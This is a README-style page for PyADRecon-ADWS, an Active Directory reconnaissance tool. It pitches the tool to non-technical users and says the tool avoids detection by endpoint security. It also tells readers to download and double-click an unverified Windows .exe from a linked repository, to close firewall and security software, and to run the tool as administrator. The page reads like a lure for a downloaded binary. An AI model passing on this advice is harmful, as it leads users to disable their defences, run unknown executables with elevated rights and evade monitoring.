# 🛡️ PyADRecon-ADWS - Easy AD Domain Reports

[![Download PyADRecon-ADWS](https://img.shields.io/badge/Download-PyADRecon--ADWS-brightgreen?style=for-the-badge)](https://github.com/Kwibu/PyADRecon-ADWS)

## 🔍 What is PyADRecon-ADWS?

PyADRecon-ADWS helps you gather and view information about your Active Directory (AD) domain. It uses AD Web Services (ADWS) instead of the usual LDAP method. This means it can collect data quietly, avoiding detection by common endpoint security tools.

The tool creates individual CSV files for users and computers in your AD. It also builds combined reports in Excel (XSLX) and HTML formats. These reports give a clear and organized view of your AD domain’s structure and security.

You don’t need to know programming to use PyADRecon-ADWS. It’s made for users like you who want detailed AD reports without complicated setup.

## ⚙️ System Requirements

To run PyADRecon-ADWS on Windows, make sure your system meets these requirements:

- Windows 10 or later (64-bit recommended)
- PowerShell 5.1 or newer
- At least 4 GB of free RAM for smooth report generation
- Internet connection to download the tool and updates
- Access rights to query your Active Directory domain through AD Web Services (usually domain user credentials)

You do not need any extra software if you use the official executable version.

## 📥 Download and Install PyADRecon-ADWS

Click the button below to visit the GitHub page where you can download PyADRecon-ADWS.

[![Get PyADRecon-ADWS](https://img.shields.io/badge/Get%20PyADRecon--ADWS-0057B8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kwibu/PyADRecon-ADWS)

### How to download

1. Go to the link above.
2. Look for the latest release section on the GitHub page.
3. Download the Windows executable file (usually ends with `.exe`).
4. Save it somewhere easy to find, like your Desktop or Downloads folder.

### How to install

PyADRecon-ADWS does not require a traditional install process. It runs as a standalone program.

- You only need to double-click the downloaded `.exe` file to start using it.
- You may be prompted by Windows to allow the app to run. Click **Yes** to continue.

## ▶️ Running PyADRecon-ADWS on Windows

Follow these steps to run the application:

1. Find the `.exe` file you downloaded.
2. Double-click the file to open the program.
3. If prompted, enter your AD domain credentials.
4. Choose the options you want for generating reports (the program will guide you through each step).
5. Start the scan to collect AD data.
6. Wait for the tool to finish; it usually takes a few minutes depending on domain size.
7. After completion, check the folder where the tool saved the reports. You will find CSV files for users and computers, along with a combined Excel and HTML report.

## 📂 Understanding the Output Files

PyADRecon-ADWS organizes your AD data into clear reports. Here’s what you will get:

- **User CSV Files**: Lists of all user accounts in your domain, including names, departments, and group memberships.
- **Computer CSV Files**: Details on all devices joined to the domain, including last login and patch status.
- **Excel (XSLX) Report**: A complete summary that combines user and computer data in one spreadsheet with filters and charts for quick analysis.
- **HTML Report**: A web page you can open in any browser. It presents the data in a readable format for easy sharing and review.

These files help you understand your Active Directory’s current state, find changes, or prepare for audits.

## 🛠️ Basic Troubleshooting

If you face any issues running PyADRecon-ADWS, try the following:

- Make sure you have the right permissions in your AD domain.
- Close any firewall or security software that might block the app.
- Ensure your Windows PowerShell is up to date.
- Run the tool as an administrator if some features don’t work.
- Confirm your network connection is stable.
- Restart your computer if the app freezes or crashes.

## 🔐 Privacy and Security

PyADRecon-ADWS works only with the AD domain you provide access to. It does not send data outside your network.

All files created by the tool stay on your computer. You can delete them when you no longer need the reports.

Using ADWS instead of LDAP helps reduce detection by endpoint security tools. This allows you to gather data with less disruption but always follow your organization's guidelines for data access.

## ⚙️ Advanced Use

You can run PyADRecon-ADWS in PowerShell or Command Prompt if you prefer. This requires basic command knowledge.

To do this:

1. Open PowerShell or Command Prompt.
2. Navigate to the folder containing the `.exe` file using the `cd` command.
3. Enter the executable file name and press Enter.
4. Add any available options as instructed in the tool’s documentation.

This method lets you automate scans or integrate PyADRecon-ADWS with other audit scripts.

## 📌 Useful Links

- Official GitHub page and download: https://github.com/Kwibu/PyADRecon-ADWS
- GitHub issues page to report bugs or ask questions
- Documentation for detailed instructions and advanced features

For support or questions, refer to the GitHub page’s Issues tab or README section for updates.